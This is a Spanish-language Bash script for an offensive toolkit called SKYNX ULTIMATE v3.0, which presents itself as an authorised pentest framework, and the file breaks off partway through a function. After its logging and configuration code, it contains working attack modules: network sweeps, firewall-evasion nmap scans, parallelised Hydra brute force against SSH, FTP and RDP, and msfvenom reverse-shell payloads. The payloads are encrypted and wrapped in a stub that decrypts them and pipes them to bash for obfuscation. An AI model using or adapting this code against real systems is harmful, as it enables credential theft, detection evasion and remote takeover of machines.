#!/bin/bash

# ═══════════════════════════════════════════════════════════════════════════
#  ███████╗██╗  ██╗██╗   ██╗███╗   ██╗██╗  ██╗
#  ██╔════╝██║ ██╔╝╚██╗ ██╔╝████╗  ██║╚██╗██╔╝
#  ███████╗█████╔╝  ╚████╔╝ ██╔██╗ ██║ ╚███╔╝ 
#  ╚════██║██╔═██╗   ╚██╔╝  ██║╚██╗██║ ██╔██╗ 
#  ███████║██║  ██╗   ██║   ██║ ╚████║██╔╝ ██╗
#  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
# ═══════════════════════════════════════════════════════════════════════════
#  SKYNX ULTIMATE v3.0
#  Framework de Auditoría de Seguridad + IA + MSF + Plugins
# ═══════════════════════════════════════════════════════════════════════════
# ────────────────────────────────────────────────────────────────────────────
# 📜 DISCLAIMER LEGAL
# ────────────────────────────────────────────────────────────────────────────
#  SKYNX es una herramienta de auditoría de seguridad diseñada
#  EXCLUSIVAMENTE para:
#    ✅ Pruebas de penetración en entornos autorizados
#    ✅ Laboratorios de ciberseguridad y formación educativa
#    ✅ Investigación y desarrollo en seguridad ofensiva
#
#  ESTÁ PROHIBIDO SU USO PARA:
#    ❌ Atacar sistemas sin autorización explícita
#    ❌ Actividades ilegales o malintencionadas
#    ❌ Cualquier uso que viole las leyes locales o internacionales
#
#  El autor de SKYNX NO se hace responsable del mal uso de esta herramienta.
#  El usuario final es el único responsable de cumplir con las leyes aplicables.
#
#  Al descargar, instalar o utilizar SKYNX, aceptas estos términos.
# ────────────────────────────────────────────────────────────────────────────

# ────────────────────────────────────────────────────────────────────────────
# 📜 CRÉDITOS E INSPIRACIONES
# ────────────────────────────────────────────────────────────────────────────
#  AUTOR PRINCIPAL (Skylx)
#
#  INSPIRADO EN:
#    - Metasploit Framework (© Rapid7) - Explotación y post-explotación
#    - Nmap (© Gordon Lyon) - Escaneo de puertos y redes
#    - Hydra (© van Hauser) - Fuerza bruta de contraseñas
#    - RustScan (© RustScan Team) - Escaneo ultrarrápido de puertos
#    - Ollama (© Ollama Team) - Motor de IA local
#    - Aircrack-ng (© Aircrack-ng Team) - Auditoría WiFi
#    - Hashcat (© Hashcat Team) - Fuerza bruta con GPU
#    - John the Ripper (© Openwall) - Crackeo de hashes
#    - Masscan (© Robert Graham) - Escaneo masivo de puertos
#    - SQLMap (© Bernardo Damele) - Inyección SQL automatizada
#    - Nikto (© Chris Sullo) - Escaneo de vulnerabilidades web
# ────────────────────────────────────────────────────────────────────────────

# ────────────────────────────────────────────────────────────────────────────
# CONFIGURACIÓN INICIAL Y COLORES
# ────────────────────────────────────────────────────────────────────────────

if [[ -t 1 ]]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    MAGENTA='\033[0;35m'
    CYAN='\033[0;36m'
    WHITE='\033[1;37m'
    DARK='\033[2;30m'
    BOLD='\033[1m'
    NC='\033[0m'
else
    RED=''; GREEN=''; YELLOW=''; BLUE=''; MAGENTA=''; CYAN=''; WHITE=''; DARK=''; BOLD=''; NC=''
fi

# ────────────────────────────────────────────────────────────────────────────
# VARIABLES GLOBALES
# ────────────────────────────────────────────────────────────────────────────

VERSION="3.0 Ultimate"
LOG_FILE="/var/log/skynx.log"
declare -g TARGET_IP=""
declare -g FILE_TARGET=""
declare -g MODE=""
declare -g LHOST=""
declare -g LPORT=""
declare -g OS_TYPE=""
declare -g USER_LIST=""
declare -g PASS_LIST=""
declare -g ACTION=""
declare -g REPORT_TYPE=""
declare -g ENCRYPT_KEY=""
declare -g SKYNX_TEMP="/dev/shm/skynx_$$"
declare -g SKYNX_SILENT=false
declare -g SKYNX_DEBUG=false
declare -g SKYNX_START_TIME=""

# ────────────────────────────────────────────────────────────────────────────
# SISTEMA DE LOGS AVANZADO CON ROTACIÓN
# ────────────────────────────────────────────────────────────────────────────

SKYNX_LOG_DIR="/var/log/skynx"
SKYNX_LOG_FILE="${SKYNX_LOG_DIR}/skynx.log"
SKYNX_LOG_MAX_SIZE="10M"
SKYNX_LOG_BACKUPS=5
SKYNX_LOG_BUFFER=()
SKYNX_LOG_BUFFER_MAX=50
SKYNX_LOG_LAST_FLUSH=0

fn_init_logs() {
    mkdir -p "$SKYNX_LOG_DIR" 2>/dev/null
    chmod 755 "$SKYNX_LOG_DIR" 2>/dev/null
    SKYNX_LOG_LAST_FLUSH=$(date +%s)
    
    if [[ -f "$SKYNX_LOG_FILE" ]]; then
        local log_size=$(stat -c%s "$SKYNX_LOG_FILE" 2>/dev/null || echo 0)
        local max_size=$((10 * 1024 * 1024))
        
        if [[ $log_size -gt $max_size ]]; then
            for i in $(seq $SKYNX_LOG_BACKUPS -1 1); do
                local src="${SKYNX_LOG_FILE}.$((i-1))"
                local dst="${SKYNX_LOG_FILE}.$i"
                [[ -f "$src" ]] && mv "$src" "$dst" 2>/dev/null
            done
            mv "$SKYNX_LOG_FILE" "${SKYNX_LOG_FILE}.0" 2>/dev/null
            touch "$SKYNX_LOG_FILE" 2>/dev/null
        fi
    fi
}

fn_log_async() {
    local level="$1"
    local msg="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local log_entry="[$timestamp] [$level] [$$] $msg"
    
    SKYNX_LOG_BUFFER+=("$log_entry")
    
    local current_time=$(date +%s)
    if [[ ${#SKYNX_LOG_BUFFER[@]} -ge $SKYNX_LOG_BUFFER_MAX ]] || \
       [[ $((current_time - SKYNX_LOG_LAST_FLUSH)) -ge 5 ]]; then
        fn_flush_logs
        SKYNX_LOG_LAST_FLUSH=$current_time
    fi
}

fn_flush_logs() {
    if [[ ${#SKYNX_LOG_BUFFER[@]} -gt 0 ]]; then
        printf "%s\n" "${SKYNX_LOG_BUFFER[@]}" >> "$SKYNX_LOG_FILE" 2>/dev/null
        SKYNX_LOG_BUFFER=()
    fi
}

fn_log_info() { fn_log_async "INFO" "$1"; }
fn_log_error() { fn_log_async "ERROR" "$1"; }
fn_log_warn() { fn_log_async "WARN" "$1"; }
fn_log_debug() { [[ "$SKYNX_DEBUG" == "true" ]] && fn_log_async "DEBUG" "$1"; }

trap fn_flush_logs EXIT

# ────────────────────────────────────────────────────────────────────────────
# SISTEMA DE ERRORES AVANZADO
# ────────────────────────────────────────────────────────────────────────────

SKYNX_ERROR_DIR="/tmp/skynx_errors"
mkdir -p "$SKYNX_ERROR_DIR" 2>/dev/null

fn_error_advanced() {
    local code="$1"
    local msg="$2"
    local line="${3:-$BASH_LINENO}"
    local func="${4:-$FUNCNAME[1]}"
    
    fn_log_error "Code: $code | Line: $line | Func: $func | Msg: $msg"
    
    local error_file="${SKYNX_ERROR_DIR}/error_$(date '+%Y%m%d_%H%M%S').txt"
    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "SKYNX ERROR REPORT"
        echo "───────────────────────────────────────────────────────────────"
        echo "Fecha: $(date)"
        echo "Código: $code"
        echo "Mensaje: $msg"
        echo "Línea: $line"
        echo "Función: $func"
        echo "PID: $$"
        echo "═══════════════════════════════════════════════════════════════"
    } > "$error_file" 2>/dev/null
    
    echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║                    ERROR CRÍTICO DE SKYNX                    ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${YELLOW}[!] Código: $code${NC}"
    echo -e "${YELLOW}[!] Mensaje: $msg${NC}"
    echo -e "${YELLOW}[!] Línea: $line${NC}"
    echo -e "${YELLOW}[!] Función: $func${NC}"
    echo -e "${DARK}[!] Log: $error_file${NC}"
    
    if [[ $code -ge 100 ]]; then
        exit $code
    fi
    return $code
}

trap 'fn_error_advanced 999 "Error inesperado en línea $LINENO" "$LINENO" "${FUNCNAME[0]}"' ERR

# ────────────────────────────────────────────────────────────────────────────
# SISTEMA DE CONFIGURACIÓN CENTRALIZADO
# ────────────────────────────────────────────────────────────────────────────

SKYNX_CONFIG_DIR="/etc/skynx"
SKYNX_CONFIG_FILE="${SKYNX_CONFIG_DIR}/skynx.conf"
declare -A SKYNX_CONFIG

fn_init_config() {
    mkdir -p "$SKYNX_CONFIG_DIR" 2>/dev/null
    chmod 755 "$SKYNX_CONFIG_DIR" 2>/dev/null
    
    SKYNX_CONFIG["LHOST"]="$(fn_get_ip_fast)"
    SKYNX_CONFIG["LPORT"]="4444"
    SKYNX_CONFIG["TIMEOUT"]="30"
    SKYNX_CONFIG["SCAN_SPEED"]="4"
    SKYNX_CONFIG["MAX_THREADS"]="8"
    SKYNX_CONFIG["LOG_LEVEL"]="INFO"
    
    if [[ ! -f "$SKYNX_CONFIG_FILE" ]]; then
        local random_key=$(openssl rand -base64 32 2>/dev/null | tr -d '\n')
        if [[ -z "$random_key" ]]; then
            random_key="Skynx$(date +%s | sha256sum | head -c 20)"
        fi
        SKYNX_CONFIG["ENCRYPT_KEY"]="$random_key"
        echo -e "${YELLOW}[!] Clave de cifrado generada automáticamente:${NC}"
        echo -e "${CYAN}   $random_key${NC}"
        echo -e "${YELLOW}[!] GUARDA ESTA CLAVE EN UN LUGAR SEGURO${NC}"
        echo -e "${YELLOW}[!] Está guardada en $SKYNX_CONFIG_FILE${NC}"
    else
        while IFS='=' read -r key value; do
            [[ -z "$key" || "$key" =~ ^# ]] && continue
            SKYNX_CONFIG["$key"]="$value"
        done < "$SKYNX_CONFIG_FILE"
    fi
    
    fn_save_config
}

fn_save_config() {
    {
        echo "# SKYNX ULTIMATE CONFIGURATION FILE"
        echo "# $(date)"
        echo "# ──────────────────────────────────────────────"
        for key in "${!SKYNX_CONFIG[@]}"; do
            echo "$key=${SKYNX_CONFIG[$key]}"
        done
    } > "$SKYNX_CONFIG_FILE" 2>/dev/null
    chmod 600 "$SKYNX_CONFIG_FILE" 2>/dev/null
    fn_log_info "Configuración guardada en $SKYNX_CONFIG_FILE"
}

fn_config_get() {
    local key="$1"
    echo "${SKYNX_CONFIG[$key]:-}"
}

fn_config_set() {
    local key="$1"
    local value="$2"
    SKYNX_CONFIG["$key"]="$value"
    fn_save_config
}

# ────────────────────────────────────────────────────────────────────────────
# SISTEMA DE PLUGINS
# ────────────────────────────────────────────────────────────────────────────

SKYNX_PLUGIN_DIR="/usr/local/share/skynx/plugins"
SKYNX_PLUGIN_CACHE="/tmp/skynx_plugin_cache"
declare -A SKYNX_DYNAMIC_FLAGS

fn_init_plugins() {
    mkdir -p "$SKYNX_PLUGIN_DIR" 2>/dev/null
    mkdir -p "$SKYNX_PLUGIN_CACHE" 2>/dev/null
    
    for plugin in "$SKYNX_PLUGIN_DIR"/*.sh; do
        if [[ -f "$plugin" ]]; then
            local plugin_name=$(basename "$plugin" .sh)
            source "$plugin" 2>/dev/null
            fn_log_debug "Plugin cargado: $plugin_name"
        fi
    done
    
    for meta in /usr/local/share/skynx/modules/*.meta 2>/dev/null; do
        if [[ -e "$meta" ]]; then
            local data=$(cat "$meta" 2>/dev/null)
            local f_flag=$(echo "$data" | cut -d'|' -f1)
            local f_name=$(echo "$data" | cut -d'|' -f2)
            SKYNX_DYNAMIC_FLAGS["$f_flag"]="$f_name"
        fi
    done
}

# ────────────────────────────────────────────────────────────────────────────
# SISTEMA DE DEPENDENCIAS
# ────────────────────────────────────────────────────────────────────────────

declare -A SKYNX_DEPENDENCIES=(
    ["nmap"]="nmap"
    ["hydra"]="hydra"
    ["sqlmap"]="sqlmap"
    ["nikto"]="nikto"
    ["aircrack-ng"]="aircrack-ng"
    ["john"]="john"
    ["hashcat"]="hashcat"
    ["msfconsole"]="metasploit-framework"
    ["ollama"]="ollama"
    ["sqlite3"]="sqlite3"
    ["curl"]="curl"
    ["tmux"]="tmux"
    ["openssl"]="openssl"
    ["steghide"]="steghide"
    ["exiftool"]="exiftool"
    ["rustscan"]="rustscan"
    ["masscan"]="masscan"
    ["parallel"]="parallel"
    ["gzip"]="gzip"
)

fn_check_deps() {
    local missing=()
    local installed=()
    
    echo -e "${CYAN}[*] Verificando dependencias...${NC}"
    
    for cmd in "${!SKYNX_DEPENDENCIES[@]}"; do
        if command -v "$cmd" &>/dev/null; then
            installed+=("$cmd")
        else
            missing+=("$cmd")
        fi
    done
    
    echo -e "${GREEN}[✓] Instaladas: ${#installed[@]}${NC}"
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[!] Faltantes: ${#missing[@]}${NC}"
        echo -e "${YELLOW}[*] ¿Instalar dependencias faltantes? (s/N)${NC}"
        read -r answer
        if [[ "$answer" == "s" || "$answer" == "S" ]]; then
            for dep in "${missing[@]}"; do
                local pkg="${SKYNX_DEPENDENCIES[$dep]}"
                echo -e "${CYAN}[*] Instalando $dep...${NC}"
                sudo apt install -y "$pkg" >/dev/null 2>&1
            done
            echo -e "${GREEN}[✓] Dependencias instaladas${NC}"
        fi
    fi
}

# ────────────────────────────────────────────────────────────────────────────
# FUNCIONES BASE DEL SISTEMA
# ────────────────────────────────────────────────────────────────────────────

if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[ERROR]${NC} Se requiere sudo"
    echo -e "${YELLOW}[USO]${NC} sudo Skynx [opciones]"
    exit 1
fi

fn_get_ip_fast() {
    local ip=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
    if [[ -n "$ip" ]]; then
        echo "$ip"
        return 0
    fi
    ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    if [[ -n "$ip" ]]; then
        echo "$ip"
        return 0
    fi
    echo "127.0.0.1"
}

fn_check_dep() {
    local cmd="$1"
    local pkg="${2:-$1}"
    
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${YELLOW}[!] Instalando $pkg...${NC}"
        sudo apt install -y "$pkg" >/dev/null 2>&1
    fi
}

fn_install_rustscan() {
    if command -v rustscan &>/dev/null; then
        return 0
    fi
    
    echo -e "${CYAN}[*] Instalando RustScan...${NC}"
    curl -sSf https://raw.githubusercontent.com/rustscan/rustscan/main/install.sh | bash -s -- --force 2>/dev/null
    if command -v rustscan &>/dev/null; then
        echo -e "${GREEN}[✓] RustScan instalado${NC}"
    else
        echo -e "${YELLOW}[!] RustScan no disponible, usando Nmap${NC}"
        return 1
    fi
}

fn_scan_ultra_fast() {
    local target="$1"
    local ports="${2:-1-65535}"
    local output_file="rustscan_$(date '+%H%M%S').txt"
    [[ -z "$target" ]] && fn_error_advanced 705 "Uso: Skynx --ultra-scan <IP> [puertos]"
    fn_skynx_banner
    echo -e "${CYAN}[+] ESCANEO ULTRA RÁPIDO CON RUSTSCAN: $target${NC}\n"
    fn_install_rustscan
    {
        echo "RUSTSCAN ADVANCED - $(date)"
        echo "────────────────────────────────"
        rustscan -a "$target" -p "$ports" --ulimit 5000 --timeout 2000 -- -sV
    } > "$output_file"
    cat "$output_file"
    echo -e "\n${GREEN}[✓] Escaneo de Rust completo. Reporte en: $output_file${NC}"
}

fn_skynx_banner() {
    clear
    echo -e "${RED}"
    echo "  ███████╗██╗  ██╗██╗   ██╗███╗   ██╗██╗  ██╗"
    echo "  ██╔════╝██║ ██╔╝╚██╗ ██╔╝████╗  ██║╚██╗██╔╝"
    echo "  ███████╗█████╔╝  ╚████╔╝ ██╔██╗ ██║ ╚███╔╝ "
    echo "  ╚════██║██╔═██╗   ╚██╔╝  ██║╚██╗██║ ██╔██╗ "
    echo "  ███████║██║  ██╗   ██║   ██║ ╚████║██╔╝ ██╗"
    echo "  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${CYAN}    SKYNX ULTIMATE v3.0 - $(fn_skynx_phrase)${NC}"
    echo -e "${DARK}    ═══════════════════════════════════════════════════════════${NC}"
    echo ""
}

fn_skynx_phrase() {
    local phrases=(
        "Skynx está despierto..."
        "La inteligencia artificial ha tomado el control"
        "No hay firewall que resista a Skynx"
        "Skynx te observa desde las sombras"
        "El futuro es Skynx"
        "Tu red pertenece a Skynx ahora"
        "Skynx no perdona, Skynx no olvida"
        "La resistencia es inútil"
        "Bienvenido al futuro"
        "El sistema es tuyo... por ahora"
    )
    echo "${phrases[$((RANDOM % ${#phrases[@]}))]}"
}

fn_epic_phrase() {
    local phrases=(
        "El sistema es tuyo... por ahora"
        "Ni el firewall te vio venir"
        "Como un fantasma en la red"
        "Las puertas están abiertas"
        "El silencio es tu aliado"
        "Nada quedó registrado"
        "La red te pertenece"
        "Invisible como el viento"
        "El objetivo cayó sin ruido"
        "Tu rastro se desvanece"
    )
    echo "${phrases[$((RANDOM % ${#phrases[@]}))]}"
}

fn_operation_name() {
    local names=(
        "Sombra Nocturna" "Fantasma Digital" "Serpiente Roja"
        "Aguila Silenciosa" "Lobo Solitario" "Dragon Dormido"
        "Fenix Oscuro" "Vibora Veloz" "Cuervo Ciego" "Tigre Fantasma"
    )
    echo "${names[$((RANDOM % ${#names[@]}))]}"
}

# ────────────────────────────────────────────────────────────────────────────
# FUNCIONES DE INTERFAZ Y ANIMACIONES
# ────────────────────────────────────────────────────────────────────────────

fn_spinner() {
    local pid=$1
    local msg="${2:-Procesando...}"
    local chars='⣾⣽⣻⢿⡿⣟⣯⣷'
    local delay=0.1
    
    tput civis 2>/dev/null
    while kill -0 "$pid" 2>/dev/null; do
        for char in $(echo "$chars" | grep -o .); do
            printf "\r${CYAN}[${YELLOW}%s${CYAN}]${NC} %s" "$char" "$msg"
            sleep "$delay"
        done
    done
    tput cnorm 2>/dev/null
    printf "\r${GREEN}[✓]${NC} %s\n" "$msg"
}

fn_progress_bar() {
    local current="$1"
    local total="$2"
    local width=40
    local percent=$((current * 100 / total))
    local filled=$((percent * width / 100))
    local empty=$((width - filled))
    
    printf "\r${CYAN}["
    for ((i=0; i<filled; i++)); do printf "${GREEN}█${NC}"; done
    for ((i=0; i<empty; i++)); do printf "${DARK}█${NC}"; done
    printf "] ${YELLOW}%3d%%${NC}" "$percent"
}

fn_progress_advanced() {
    local current="$1"
    local total="$2"
    local start_time="${3:-$SKYNX_START_TIME}"
    local width=40
    
    local percent=$((current * 100 / total))
    local filled=$((percent * width / 100))
    local empty=$((width - filled))
    local elapsed=$(( $(date +%s) - start_time ))
    
    local eta="???"
    if [[ $current -gt 0 ]]; then
        local remaining=$(( (total - current) * elapsed / current ))
        if [[ $remaining -lt 60 ]]; then
            eta="${remaining}s"
        elif [[ $remaining -lt 3600 ]]; then
            eta="$((remaining / 60))m $((remaining % 60))s"
        else
            eta="$((remaining / 3600))h $(( (remaining % 3600) / 60 ))m"
        fi
    fi
    
    printf "\r${CYAN}["
    for ((i=0; i<filled; i++)); do printf "${GREEN}█${NC}"; done
    for ((i=0; i<empty; i++)); do printf "${DARK}█${NC}"; done
    printf "] ${YELLOW}%3d%%${NC} ${DARK}|${NC} ${WHITE}ETA: %s${NC}" "$percent" "$eta"
}

fn_typewriter_effect() {
    local text="$1"
    local delay="${2:-0.05}"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep "$delay"
    done
    echo ""
}

fn_msg_success() { echo -e "${GREEN}✅ $1${NC}"; }
fn_msg_error() { echo -e "${RED}❌ $1${NC}"; }
fn_msg_warning() { echo -e "${YELLOW}⚠️ $1${NC}"; }
fn_msg_info() { echo -e "${CYAN}ℹ️ $1${NC}"; }

fn_msg_box() {
    local msg="$1"
    local len=${#msg}
    local padding=2
    
    echo -e "${CYAN}┌$(printf '─%.0s' $(seq 1 $((len + padding * 2))))┐${NC}"
    echo -e "${CYAN}│${NC} ${WHITE}$msg${NC} ${CYAN}│${NC}"
    echo -e "${CYAN}└$(printf '─%.0s' $(seq 1 $((len + padding * 2))))┘${NC}"
}

# ────────────────────────────────────────────────────────────────────────────
# SISTEMA DE CACHÉ
# ────────────────────────────────────────────────────────────────────────────

SKYNX_CACHE_DIR="/tmp/skynx_cache_$$"
mkdir -p "$SKYNX_CACHE_DIR" 2>/dev/null

fn_cache_get() {
    local key="$1"
    local ttl="${2:-300}"
    local cache_file="${SKYNX_CACHE_DIR}/${key}.cache"
    
    if [[ -f "$cache_file" ]]; then
        local age=$(( $(date +%s) - $(stat -c %Y "$cache_file" 2>/dev/null || echo 0) ))
        if [[ $age -lt $ttl ]]; then
            cat "$cache_file" 2>/dev/null
            return 0
        fi
    fi
    return 1
}

fn_cache_set() {
    local key="$1"
    local value="$2"
    echo "$value" > "${SKYNX_CACHE_DIR}/${key}.cache" 2>/dev/null
}

fn_cache_clear() {
    rm -rf "$SKYNX_CACHE_DIR"/* 2>/dev/null
}

fn_parallel_execute() {
    local max_jobs="${1:-4}"
    shift
    local tasks=("$@")
    local pids=()
    
    for task in "${tasks[@]}"; do
        # Ejecuta la tarea en segundo plano respetando funciones internas y argumentos
        ( builtin history -s "$task"; $task ) &
        pids+=($!)
        
        while [[ ${#pids[@]} -ge $max_jobs ]]; do
            local temp_pids=()
            for pid in "${pids[@]}"; do
                if kill -0 "$pid" 2>/dev/null; then
                    temp_pids+=("$pid")
                fi
            done
            pids=("${temp_pids[@]}")
            sleep 0.1
        done
    done
    
    for pid in "${pids[@]}"; do
        wait "$pid" 2>/dev/null
    done
}

# ────────────────────────────────────────────────────────────────────────────
# VALIDACIÓN DE DATOS
# ────────────────────────────────────────────────────────────────────────────

fn_validate_ip_fast() {
    local ip="$1"
    local regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    if [[ "$ip" =~ $regex ]]; then
        IFS='.' read -r o1 o2 o3 o4 <<< "$ip"
        if ((o1 <= 255 && o2 <= 255 && o3 <= 255 && o4 <= 255)); then
            return 0
        fi
    fi
    return 1
}

fn_validate_port_fast() {
    local port="$1"
    if [[ "$port" =~ ^[0-9]+$ ]] && ((port >= 1 && port <= 65535)); then
        return 0
    fi
    return 1
}

fn_validate_url_fast() {
    local url="$1"
    if [[ "$url" =~ ^https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,} ]]; then
        return 0
    fi
    return 1
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MÓDULOS DE RECONOCIMIENTO (1-5)
# ═══════════════════════════════════════════════════════════════════════════

fn_module_recon() {
    local output_file="reporte_red_completa_$(date '+%H%M%S').txt"
    
    fn_skynx_banner
    echo -e "${CYAN}[+] RECONOCIMIENTO DE RED MEJORADO${NC}"
    echo ""
    
    fn_install_rustscan
    fn_log_info "Reconocimiento mejorado iniciado"
    
    local start_time=$(date +%s)
    
    {
        echo "REPORTE DE RED MEJORADO - $(date)"
        echo "────────────────────────────────"
        echo ""
        echo "[*] Escaneo de hosts activos:"
        
        for i in {1..254}; do
            (
                ip="192.168.1.$i"
                if ping -c 1 -W 1 "$ip" 2>/dev/null | grep -q "ttl"; then
                    echo "  ➔ Host activo: $ip"
                    
                    local ports=$(rustscan -a "$ip" -p 80,443,22,21,25,3306,3389,8080 --ulimit 1000 --timeout 2000 2>/dev/null | grep -oP '\d+(?=/tcp)' | tr '\n' ',' | sed 's/,$//')
                    if [[ -n "$ports" ]]; then
                        echo "     ➔ Puertos abiertos: $ports"
                    fi
                fi
            ) &
        done
        wait
        
        echo ""
        echo "[*] Resumen de red:"
        echo "  ➔ Total hosts: $(grep -c "Host activo" "$output_file")"
    } > "$output_file"
    
    local end_time=$(date +%s)
    local elapsed=$((end_time - start_time))
    
    cat "$output_file"
    echo -e "${GREEN}[✓] Escaneo completado en ${elapsed}s${NC}"
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_arp() {
    local output_file="reporte_arp_completo.txt"
    fn_skynx_banner
    echo -e "${CYAN}[+] ESCANEO ARP${NC}"
    echo ""
    
    fn_check_dep "arp-scan"
    {
        echo "REPORTE ARP - $(date)"
        echo "────────────────────────────────"
        arp-scan --localnet 2>/dev/null
    } > "$output_file"
    
    cat "$output_file"
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_audit() {
    local target="$1"
    local output_file="reporte_dispositivo.txt"
    
    [[ -z "$target" ]] && fn_error_advanced 101 "Uso: Skynx -t <IP> -e"
    
    fn_skynx_banner
    echo -e "${CYAN}[+] AUDITORÍA LAN: $target${NC}"
    echo ""
    
    fn_install_rustscan
    
    {
        echo "AUDITORÍA LAN - $(date)"
        echo "Objetivo: $target"
        echo "────────────────────────────────"
        echo ""
        echo "[FASE 1/3] Escaneo rápido de puertos:"
        rustscan -a "$target" -p 1-10000 --ulimit 5000 --timeout 3000 2>/dev/null
        echo ""
        echo "[FASE 2/3] Vulnerabilidades:"
        nmap -sV -Pn --script=vulners "$target" 2>/dev/null
        echo ""
        echo "[FASE 3/3] Versiones:"
        nmap -sS -f --data-length 24 -sV "$target" 2>/dev/null
    } > "$output_file"
    
    grep -E "^[0-9]+/tcp.*open" "$output_file" | awk '{print "    " $1 " → " $3}'
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_evasion() {
    local target="$1"
    local output_file="reporte_evasion_extrema.txt"
    
    [[ -z "$target" ]] && fn_error_advanced 102 "Uso: Skynx -ex <IP>"
    
    fn_skynx_banner
    echo -e "${CYAN}[+] EVASIÓN EXTREMA: $target${NC}"
    echo ""
    
    {
        echo "EVASIÓN EXTREMA - $(date)"
        echo "Objetivo: $target"
        echo "────────────────────────────────"
        nmap -f --mtu 8 --data-length 32 -T2 -Pn "$target" 2>/dev/null
        nmap -sX -T2 -Pn "$target" 2>/dev/null
        nmap -sN -T2 -Pn "$target" 2>/dev/null
    } > "$output_file"
    
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_bruteforce() {
    local target="$1"
    local user_list="$2"
    local pass_list="$3"
    local servicio="${4:-ssh}"
    local threads="${5:-8}"
    local output_file="reporte_fuerza_bruta_mejorado.txt"
    
    [[ -z "$target" || -z "$user_list" || -z "$pass_list" ]] && \
        fn_error_advanced 103 "Uso: Skynx -bf <IP> <users.txt> <pass.txt> [ssh|ftp|rdp] [threads]"
    
    fn_skynx_banner
    echo -e "${RED}[+] FUERZA BRUTA MEJORADA: $target via ${servicio^^}${NC}"
    echo -e "${YELLOW}[*] Hilos: $threads | Tiempo estimado: $(($(wc -l < "$pass_list" 2>/dev/null || echo 0) / threads / 10))s${NC}"
    echo ""
    
    fn_check_dep "hydra"
    
    local start_time=$(date +%s)
    
    {
        echo "FUERZA BRUTA MEJORADA - $(date)"
        echo "Objetivo: $target"
        echo "Servicio: $servicio"
        echo "Hilos: $threads"
        echo "────────────────────────────────"
        echo ""
        
        local total_lines=$(wc -l < "$pass_list" 2>/dev/null || echo 1)
        local chunk_size=$(( total_lines / threads + 1 ))
        local temp_dir="/tmp/hydra_chunks_$$"
        mkdir -p "$temp_dir"
        
        split -l "$chunk_size" "$pass_list" "$temp_dir/chunk_" 2>/dev/null
        
        local pids=()
        local chunk_files=($(ls "$temp_dir"/chunk_* 2>/dev/null))
        
        for chunk in "${chunk_files[@]}"; do
            (
                hydra -L "$user_list" -P "$chunk" "${servicio}://${target}" -t 2 2>/dev/null | \
                    grep -E "login:|password:|Valid" || echo "[-] Sin resultados en $(basename "$chunk")"
            ) &
            pids+=($!)
        done
        
        local completed=0
        while [[ $completed -lt ${#pids[@]} ]]; do
            completed=0
            for pid in "${pids[@]}"; do
                if ! kill -0 "$pid" 2>/dev/null; then
                    ((completed++))
                fi
            done
            fn_progress_bar "$completed" "${#pids[@]}"
            sleep 1
        done
        echo ""
        
        wait
        rm -rf "$temp_dir"
    } > "$output_file"
    
    local end_time=$(date +%s)
    local elapsed=$((end_time - start_time))
    
    echo -e "${GREEN}[✓] Ataque completado en ${elapsed}s${NC}"
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MÓDULOS DE PAYLOADS Y EXPLOTACIÓN (6-10)
# ═══════════════════════════════════════════════════════════════════════════

fn_module_payloads_improved() {
    local lhost="$1"
    local lport="$2"
    local os_type="$3"
    local output_dir="payloads_${os_type}_$(date '+%H%M%S')"
    local encrypt_key=$(fn_config_get "ENCRYPT_KEY")
    
    [[ -z "$lhost" || -z "$lport" || -z "$os_type" ]] && \
        fn_error_advanced 104 "Uso: Skynx -w/-l/-an <LHOST> <LPORT>"
    
    fn_skynx_banner
    echo -e "${MAGENTA}[+] GENERANDO PAYLOADS MEJORADOS: $os_type${NC}"
    echo -e "${YELLOW}[*] Técnicas: Ofuscación + Compresión + Persistencia${NC}"
    echo ""
    
    fn_check_dep "msfvenom"
    fn_check_dep "gzip"
    fn_check_dep "openssl"
    
    mkdir -p "$output_dir"
    
    fn_generate_payload_advanced() {
        local desc="$1"
        local payload="$2"
        local ext="$3"
        local format="$4"
        local filename="${output_dir}/${desc}.${ext}"
        local encrypted="${output_dir}/${desc}_encrypted.${ext}"
        
        echo -e "${CYAN}[+] Generando: $desc${NC}"
        
        msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" \
            -f "$format" -o "$filename" 2>/dev/null
        
        if [[ -f "$filename" ]]; then
            gzip -c "$filename" > "${filename}.gz"
            
            openssl enc -aes-256-cbc -salt -in "${filename}.gz" -out "${encrypted}" \
                -pass "pass:${encrypt_key}" 2>/dev/null
            
            # ✅ CORREGIDO: Escribir el stub directamente con la clave
            cat > "${output_dir}/run_${desc}.sh" <<EOF
#!/bin/bash
# SKYNX PAYLOAD STUB
openssl enc -d -aes-256-cbc -in "\$0" -pass pass:${encrypt_key} | gunzip | bash
EOF
            chmod +x "${output_dir}/run_${desc}.sh"
            
            echo -e "${GREEN}  ✓ ${desc} generado (tamaño: $(du -h "$filename" | cut -f1))${NC}"
            echo -e "${DARK}    ➔ Original: $filename${NC}"
            echo -e "${DARK}    ➔ Cifrado: $encrypted${NC}"
            echo -e "${DARK}    ➔ Stub: ${output_dir}/run_${desc}.sh${NC}"
        fi
    }
    
